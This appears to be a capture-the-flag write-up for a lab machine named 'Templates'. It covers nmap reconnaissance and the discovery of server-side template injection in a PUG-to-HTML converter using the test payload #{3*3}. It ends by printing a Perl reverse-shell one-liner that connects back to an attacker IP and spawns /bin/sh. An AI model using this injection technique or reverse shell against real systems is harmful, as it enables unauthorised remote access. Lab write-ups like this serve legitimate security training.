Templates

Target IP: 10.10.201.29
Challenge Description:

Reconnaissance


Performing a port scan using the command sudo nmap -sS 10.10.201.29 -p- shows there are two TCP ports open on the target machine: SSH on port 22, and HTTP on port 5000.


Performing an aggressive port scan using the command sudo nmap -sV -A 10.10.201.29 -p 22,5000 returns the more detailed information about the two applications. I will start enumeration with the HTTP application on port 5000.

Enumeration

Port 5000: HTTP

The webpage above is displayed to me on this port. The web application seems to convert PUG to HTML. There is also the template code left behind.


Pressing the Convert to HTML blue button from the previous image seems to perform the HTML conversion, as shown above. In the image above, the PUG code was converted to HTML. Can I perform server-side template injection (SSTI) attack using this?


I used the PUG code shown above to test for SSTI. The payload I am testing is #{3*3}. If the server performs the 3*3 calculation and renders it then the SSTI attack vector is a possibility.


And pressing the Convert to HTML button from the previous image returns the result shown above. The target machine successfully performed the calculation and returned the result 9, as shown above. Time to exploit the machine.

Exploitation & Flag


I found the interesting website shown above. This website contains the information on how to exploit the application. It's possible to obtain a reverse shell using this web application. First, I will need to modify a payload with my IP & port in base64 format. Then I will need to use a template, which invokes a reverse shell connection, with the encoded payload in it.


In the image above, I used the payload with my IP & port and encoded it in base64 for the template injection attack.

use Socket;$i="10.14.55.153";$p=5000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
